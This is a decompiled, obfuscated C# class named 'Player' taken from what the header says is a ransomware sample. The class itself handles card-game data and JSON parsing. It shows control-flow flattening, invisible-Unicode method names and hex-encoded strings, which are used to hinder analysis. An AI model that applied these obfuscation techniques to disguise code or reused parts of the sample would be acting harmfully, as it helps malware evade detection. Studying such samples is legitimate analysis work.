// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: LoadHi, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 984E9D2E-DA60-4984-B27B-15EC3C1BAA14
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5f4b796f8ee524790172ed29cc21d32e43d347e3c306781f420d7844e0a776c9.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
label_1:
      int num1 = 1535161947;
      bool flag1;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1328073590)) % 11U)
        {
          case 0:
            int num3 = !flag2 ? -1859103706 : (num3 = -1675778240);
            num1 = num3 ^ (int) num2 * -210035780;
            continue;
          case 2:
            int num4 = !flag1 ? -1228302659 : (num4 = -1703160062);
            num1 = num4 ^ (int) num2 * -140428872;
            continue;
          case 3:
            goto label_1;
          case 4:
            str1 = "49456E756D5641524941";
            num1 = (int) num2 * 927490831 ^ -1549929187;
            continue;
          case 5:
            flag2 = BaseStream == 1;
            num1 = 909644565;
            continue;
          case 6:
            num1 = (int) num2 * -1756747979 ^ -834522952;
            continue;
          case 7:
            str2 = str1;
            num1 = 619379314;
            continue;
          case 8:
            flag1 = BaseStream == 0;
            num1 = (int) num2 * 1471267588 ^ -1975840822;
            continue;
          case 9:
            num1 = (int) num2 * 203309831 ^ -178814747;
            continue;
          case 10:
            str1 = "75755068";
            num1 = (int) num2 * -1281209094 ^ 1096996198;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -1518959936;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -1002580658)) % 5U)
        {
          case 1:
            if (this.PlanningCards.Length != 0)
            {
              num4 = this.PlanningCards[cardTypeIndex];
              break;
            }
            num1 = (int) num3 * 1187724103 ^ 1137483980;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num3 * 1593679054 ^ 1614415447;
            continue;
          case 4:
            num4 = 0;
            break;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = -2101646421;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = 1091715506;
        int index;
        int[] planningCards;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ 205756292)) % 14U)
          {
            case 0:
              int num5;
              num2 = num5 = index < planningCards.Length ? 160031134 : (num5 = 1097481419);
              continue;
            case 1:
              ++num1;
              num2 = (int) num4 * 777523068 ^ -1586076945;
              continue;
            case 2:
              goto label_1;
            case 3:
              num2 = (int) num4 * -1534693578 ^ 1805601750;
              continue;
            case 4:
              num3 = planningCards[index];
              num2 = 126158837;
              continue;
            case 5:
              planningCardsCount = num1;
              num2 = (int) num4 * -1302731505 ^ 804069875;
              continue;
            case 6:
              index = 0;
              num2 = (int) num4 * -897805619 ^ -860000659;
              continue;
            case 7:
              ++index;
              num2 = (int) num4 * 915301890 ^ -674318562;
              continue;
            case 8:
              planningCards = this.PlanningCards;
              num2 = (int) num4 * -853819543 ^ -2111879594;
              continue;
            case 10:
              int num6 = num3 <= 0 ? -1113398471 : (num6 = -1623330615);
              num2 = num6 ^ (int) num4 * 533333561;
              continue;
            case 11:
              num2 = (int) num4 * -1576461878 ^ 1855118284;
              continue;
            case 12:
              num2 = (int) num4 * -1355659677 ^ 1282768101;
              continue;
            case 13:
              num2 = 1531862463;
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 1076343861;
      string str1;
      bool flag1;
      int index;
      int planningCard;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 167124599)) % 16U)
        {
          case 0:
            num1 = (int) num2 * -1290152686 ^ -202529502;
            continue;
          case 1:
            int num3 = !flag1 ? -83298662 : (num3 = -1965360589);
            num1 = num3 ^ (int) num2 * 605687412;
            continue;
          case 2:
            str1 = " ";
            num1 = (int) num2 * -1401918388 ^ 1303163346;
            continue;
          case 3:
            str2 = str1;
            num1 = (int) num2 * 1063704377 ^ 1406602263;
            continue;
          case 4:
            num1 = (int) num2 * -1084933351 ^ 567933206;
            continue;
          case 5:
            ++index;
            num1 = 973827440;
            continue;
          case 7:
            flag2 = index < this.PlanningCards.Length;
            num1 = 164338680;
            continue;
          case 8:
            goto label_1;
          case 9:
            str1 = Player.\u200C‭‫‪‮‬‬‪‮⁫⁪‏‮⁮⁭⁬‏‫⁪‬‌‌‬‍‬⁫‍​‎‮⁫‍‍‪‬‌‍​⁪‏‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 1666264707;
            continue;
          case 10:
            flag1 = planningCard == 0;
            num1 = (int) num2 * -1839833882 ^ -758415014;
            continue;
          case 11:
            num1 = (int) num2 * -1667438355 ^ -517396866;
            continue;
          case 12:
            num1 = (int) num2 * 1275286423 ^ -519914940;
            continue;
          case 13:
            index = 0;
            num1 = (int) num2 * 1258454056 ^ -201911533;
            continue;
          case 14:
            planningCard = this.PlanningCards[index];
            num1 = 126146637;
            continue;
          case 15:
            int num4 = flag2 ? -700973917 : (num4 = -1793987122);
            num1 = num4 ^ (int) num2 * -2027819418;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -1194508729;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -428892515)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -701168565 ^ 755435094;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = -2015075311;
      int aIndex;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -498077164)) % 10U)
        {
          case 0:
            int num3;
            num1 = num3 = aIndex >= count ? -169265333 : (num3 = -1426328026);
            continue;
          case 1:
            planningCards = numArray;
            num1 = (int) num2 * 497073931 ^ 1554732493;
            continue;
          case 2:
            ++aIndex;
            num1 = (int) num2 * -1985790707 ^ 898942800;
            continue;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num2 * -320776496 ^ -560566280;
            continue;
          case 5:
            num1 = (int) num2 * -1252796643 ^ 863261457;
            continue;
          case 6:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -1034349748;
            continue;
          case 7:
            numArray = new int[count];
            num1 = (int) num2 * -1308617610 ^ 550207513;
            continue;
          case 9:
            aIndex = 0;
            num1 = (int) num2 * -1380063133 ^ -737346512;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
      string str = Player.\u202A⁯‏⁬‏⁬⁭‏‪‮‬‫⁫‪​⁭‍‍⁭‫​‭⁯⁬‌‬‭‍‍‍‌‬‫‏⁭⁭‬⁪⁮‎‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
label_1:
      int num1 = -872738104;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -504889087)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * -174752097 ^ -406712372;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u200C‭‫‪‮‬‬‪‮⁫⁪‏‮⁮⁭⁬‏‫⁪‬‌‌‬‍‬⁫‍​‎‮⁫‍‍‪‬‌‍​⁪‏‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202A⁯‏⁬‏⁬⁭‏‪‮‬‫⁫‪​⁭‍‍⁭‫​‭⁯⁬‌‬‭‍‍‍‌‬‫‏⁭⁭‬⁪⁮‎‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
